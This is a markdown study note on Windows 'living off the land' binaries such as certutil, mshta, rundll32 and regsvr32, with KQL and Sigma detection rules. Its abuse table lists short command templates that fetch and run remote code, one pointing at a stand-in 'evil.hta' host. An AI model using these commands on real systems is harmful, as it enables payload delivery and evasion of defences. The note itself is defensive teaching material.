
---

### ✅ `living-off-the-land.md`

```markdown
# 🛠️ Living off the Land Binaries (LOLBins)

## 🧠 What is it?

LOLBins are **legitimate, trusted Windows binaries** that attackers use for malicious purposes — like downloading payloads, executing code, or evading detection.

Because these tools are signed by Microsoft, they’re **often whitelisted** by AV/EDR.

> It’s like breaking into a bank using a police uniform. You're trusted — so no one questions you.

---

## ✅ Common LOLBins

| Tool         | Abuse Example                                           |
|--------------|---------------------------------------------------------|
| `certutil`   | Download files: `certutil -urlcache -split -f http://...` |
| `rundll32`   | Execute script: `rundll32.exe javascript:"..."`          |
| `mshta`      | Run malicious HTA files: `mshta http://evil.hta`         |
| `regsvr32`   | Load remote scripts: `regsvr32 /i:http://... scrobj.dll` |

---

## 🛡️ Detection Ideas (Blue Team)

- Monitor command-line use of these tools with network activity
- Detect use of flags like `/i`, `-f`, or script content
- Look for system binaries spawning non-standard processes

---

## 🔍 KQL Detection

```kql
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "rundll32.exe", "mshta.exe", "regsvr32.exe")
| where ProcessCommandLine contains "http"


📦 Sigma Rule

title: LOLBins Executing Remote Payloads
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\\certutil.exe'
      - '\\rundll32.exe'
      - '\\mshta.exe'
      - '\\regsvr32.exe'
    CommandLine|contains: "http"
  condition: selection
level: high
tags:
  - attack.defense_evasion
  - attack.t1218




